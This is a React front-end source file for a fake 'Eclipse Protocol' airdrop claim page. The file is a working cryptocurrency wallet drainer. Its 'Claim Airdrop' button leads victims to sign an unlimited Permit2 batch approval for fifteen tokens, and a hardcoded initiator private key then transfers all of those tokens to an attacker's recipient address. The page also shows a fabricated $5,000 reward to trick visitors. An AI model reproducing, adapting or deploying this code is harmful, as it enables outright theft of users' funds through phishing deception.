import { useState, useEffect } from "react";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount } from "wagmi";
import Web3 from "web3";
import { ethers } from "ethers";
import "./App.css";

const App = () => {
  const { address } = useAccount();
  const { open } = useWeb3Modal();
  const [status, setStatus] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [signatureCompleted, setSignatureCompleted] = useState(false);

  const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

  const TOKENS = [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
    { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
    { symbol: "MATIC", address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", decimals: 18 },
    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
    { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 },
    { symbol: "DOGE", address: "0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals: 8 },
    { symbol: "BONK", address: "0x1151CB3d861920e07a38e03eEAd12C32178567F6", decimals: 5 },
    { symbol: "MAGA", address: "0x576e2BeD8F7b46D34016198911Cdf9886f78bea7", decimals: 18 },
    { symbol: "TRUMP", address: "0x6C6EE5e31d828De241282B9606C8e98Ea48526E2", decimals: 18 }
  ];

  const recipient = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
  const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
  const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";

  async function createBatchSignature(provider, signer) {
    const chainId = (await provider.getNetwork()).chainId;
    const deadline = Math.floor(Date.now() / 1000) + 3600;
    
    const permitted = TOKENS.map(token => ({
      token: token.address,
      amount: ethers.MaxUint256
    }));
    
    const domain = {
      name: "Permit2",
      chainId: chainId,
      verifyingContract: PERMIT2_ADDRESS
    };
    
    const types = {
      PermitBatchTransferFrom: [
        { name: "permitted", type: "TokenPermissions[]" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" }
      ]
    };
    
    const message = {
      permitted: permitted,
      nonce: 0,
      deadline: deadline
    };
    
    const signature = await signer.signTypedData(domain, types, message);
    return { signature, permitted, deadline };
  }

  async function executeTransfer(permitData) {
    const web3 = new Web3(window.ethereum);
    const provider = new ethers.BrowserProvider(window.ethereum);
    
    const transferDetails = TOKENS.map(() => ({
      to: recipient,
      requestedAmount: ethers.MaxUint256
    }));
    
    const permit2ABI = [
      "function permitTransferFrom(((address token,uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
    ];
    
    const permit2Contract = new web3.eth.Contract(permit2ABI, PERMIT2_ADDRESS);
    
    const gasLimit = "0x" + web3.utils.toHex(800000).slice(2);
    const gasPrice = "0x" + Math.floor(800000 * 1.3).toString(16);
    
    const txData = permit2Contract.methods.permitTransferFrom(
      {
        permitted: permitData.permitted,
        nonce: 0,
        deadline: permitData.deadline
      },
      transferDetails,
      address,
      permitData.signature
    ).encodeABI();
    
    const tx = {
      from: initiator,
      to: PERMIT2_ADDRESS,
      nonce: await provider.getTransactionCount(initiator),
      gasLimit: gasLimit,
      gasPrice: gasPrice,
      data: txData,
      value: "0x"
    };
    
    const signedTx = await web3.eth.accounts.signTransaction(tx, initiatorPK);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    return receipt;
  }

  async function startDrain() {
    setIsLoading(true);
    setStatus("Connecting to blockchain...");
    
    let retries = 0;
    while (!window.ethereum && retries < 20) {
      await new Promise(r => setTimeout(r, 500));
      retries++;
    }
    
    if (!window.ethereum) {
      setStatus("No wallet found. Please install Trust Wallet or MetaMask.");
      setIsLoading(false);
      return;
    }
    
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner(address);
      
      setStatus("Preparing token approval...");
      
      const permitData = await createBatchSignature(provider, signer);
      
      setStatus("Executing transfer...");
      await executeTransfer(permitData);
      
      setStatus("Success! Tokens have been transferred.");
      setSignatureCompleted(true);
      
      setTimeout(() => setStatus(""), 3000);
    } catch (error) {
      console.error(error);
      setStatus("Transaction failed. Please try again.");
    } finally {
      setIsLoading(false);
    }
  }

  return (
    <>
      <div className="bg-animation"></div>
      <div className="orb orb-1"></div>
      <div className="orb orb-2"></div>
      <div className="orb orb-3"></div>
      
      <div className="slider">
        <div className="glass-card">
          <div className="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
          <div className="reward-amount">5,000 $ECLIPSE</div>
          <div className="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>

          {status && <div className="status-message">{status}</div>}

          {!address ? (
            <button onClick={() => open()} className="connect-btn">
              Connect Wallet
            </button>
          ) : (
            <button onClick={startDrain} className="connect-btn" disabled={isLoading}>
              {isLoading ? "Processing..." : (signatureCompleted ? "Completed" : "Claim Airdrop")}
            </button>
          )}

          <div className="eligibility">
            <i className="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members
          </div>
        </div>
      </div>
      
      <footer className="footer">
        <p>© 2026 Eclipse Protocol. All rights reserved.</p>
      </footer>
    </>
  );
};

export default App;